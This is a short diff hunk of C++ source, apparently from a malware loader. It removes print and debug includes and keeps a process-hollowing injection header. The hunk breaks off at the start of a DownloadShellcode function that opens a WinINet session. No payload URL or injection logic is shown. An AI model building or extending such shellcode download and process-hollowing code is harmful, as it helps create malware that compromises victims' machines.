@@ -1,10 +1,5 @@
 #include "include/include.h"
-#include "include/print.h"
 #include "include/injection/process_hallowing.h"
-
-#ifdef DEBUG
-#include "include/debug.h"
-#endif
 
 std::string DownloadShellcode() {
     HINTERNET hInternet = InternetOpen(reinterpret_cast<LPCSTR>("MyAgent"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
